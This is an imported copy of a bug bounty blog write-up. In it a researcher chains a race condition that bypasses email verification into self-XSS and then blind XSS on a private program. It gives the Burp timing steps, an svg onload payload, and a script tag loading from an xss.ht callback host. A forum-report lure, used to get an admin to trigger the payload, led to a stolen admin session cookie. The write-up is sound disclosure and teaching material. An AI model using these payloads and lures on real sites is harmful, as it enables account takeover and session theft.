---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-04-22_from-p5-to-p2-from-nothing-to-1000.md
original_filename: 2020-04-22_from-p5-to-p2-from-nothing-to-1000.md
title: From P5 to P2, from nothing to 1000+$
category: documents
detected_topics:
- xss
- command-injection
- race-condition
tags:
- imported
- documents
- xss
- command-injection
- race-condition
language: en
raw_sha256: 04dc31ea9cd9b9334efa315a8bdaf456c3a5ea4ec6d7e6ce9ac95fbe4c261089
text_sha256: 15f1eb5362550dce138c8878cf1dd6977d36708718cafa55827512ba51f9ff55
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# From P5 to P2, from nothing to 1000+$

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-04-22_from-p5-to-p2-from-nothing-to-1000.md
- Source Type: markdown
- Detected Topics: xss, command-injection, race-condition
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `04dc31ea9cd9b9334efa315a8bdaf456c3a5ea4ec6d7e6ce9ac95fbe4c261089`
- Text SHA256: `15f1eb5362550dce138c8878cf1dd6977d36708718cafa55827512ba51f9ff55`


## Content

---
title: "From P5 to P2, from nothing to 1000+$"
url: "https://medium.com/@mohameddaher/from-p5-to-p5-to-p2-from-nothing-to-1000-bxss-4dd26bc30a82"
authors: ["Mohamed Daher (@DaherMohamed4)"]
bugs: ["Race condition", "Self-XSS", "Blind XSS"]
bounty: "1,000"
publication_date: "2020-04-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4639
scraped_via: "browseros"
---

# From P5 to P2, from nothing to 1000+$

Mohamed Daher
 highlighted

From P5 to P2, from nothing to 1000+$
Mohamed Daher
Follow
4 min read
·
Apr 22, 2020

642

7

1

Hey all :)

Hope you guys are good as always.

As you asked for on twitter (make sure to follow me @DaherMohamed4 )

Here is how I was able to escalate this bug from P5 to P2 and got rewarded +1000$.

So let’s start.

It was the same private program as my last write up.

So I’ve been hunting on this program for a week already and already reported all my findings so I was struggling to find any more bug.

But not seeing them doesn’t mean they don’t exist :)

So I decided to start over and create a new account.

When I filled all the details, they asked me to verify my email first but I could also change the email to another one in case I made a mistake. I directly thought about Race-Condition to use any email without verifying it.

Here’s how you can do it (we’ll assume that we have access to lasok@dot-coin.com and we want to register with aa@aa.com)

1/ Add an email to the account and open the email with the verification link but don’t click on it yet (In my case I added lasok@dot-coin.com and opened the mail they sent me)

2/ On the website click on “change email”. Change the email to the one you want to use without verification but don’t click on send link now. (Now I changed the email to aa@aa.com)

lasok@dot-coin.com is a temp email

Here comes the tricky part.

You have to click on the verification link and change your email at the same time.

You can do that without burp but you may have to try a few times before it works so here is a method to make it work every time:

Start burp and turn intercept on

Now open the verification link you received on lasok@dot-coin.com then switch tab and validate the new email on the website (aa@aa.com) then turn intercept off. Burp will forward the 2 requests together and that’s what we want.

Press enter or click to view image in full size
Press enter or click to view image in full size

aa@aa.com was verified and I could now login to my account.

In this case what you should do is to register with email@company.com, sometimes you can get access to some cool admin features.

Get Mohamed Daher’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

But unfortunately for me it wasn’t the case here but I still reported it and as expected, closed as P5.

Press enter or click to view image in full size
Thanks Roy

But huh who are we to give up ?

Now we have to escalate this to give a valid impact in order to be a valid bug.

After some minutes I tried to escalate this to XSS.

Did the same process but instead of entering a fake email in the second step I entered : <svg/onload=alert(1)> and XSS triggered. But since my email is private and only me can see it, this is a Self-XSS.

So we went from Race-Condition (P5) to Self-XSS (P5).

Now, what ?

I remembered that this private program also had a forum dedicated to their site.

I did the same process again but instead of entering a regular XSS payload I entered a Blind XSS payload. Mine was : “></script><script src=//m0m0x01d.xss.ht></script> (Tip : Use xsshunter.com tool to find blind xss)

I then went to the forum, created a new weird thread (to be sure that the admin will delete it) and reported my own thread to be sure that the admins see it.

Within hours I got an email alerting me that someone triggered my XSS.

Reading the XSSHunter report :

Triggered at : https://www.company.com/profile/XXXX

Referer : https://forums.company.com/XX/index.php?/topic/123456--/

The admin saw my weird thread, then he clicked on my username → redirected to my profile → XSS triggered

The reason why it triggered was that the admins had the feature to see the email of any user only by visiting their profile.

I now had the session cookie of the admin and I could use it to get access to the internal panel.

I directly opened a new report on Bugcrowd and some days later :

Press enter or click to view image in full size

So that’s how I went from a P5 Race Condition to a P5 Self XSS to a P2 Blind XSS.

Hope you guys learnt something new from this write up and if you have any question about this hit me up on twitter @DaherMohamed4 I will try to reply when I’m free.

Take-away :

1/ If you’r able to use any email without verification, try registering with email@domain.com you may get access to some admin features

2/ Always look for the highest severity. Here if the program accepted the bug as P4 I would get 100$ for that instead of 10x the bounty for the XSS

3/ When you find a P5 bug you may use it and chain it with another bug to increase the severity (tip 2), they are not always useless
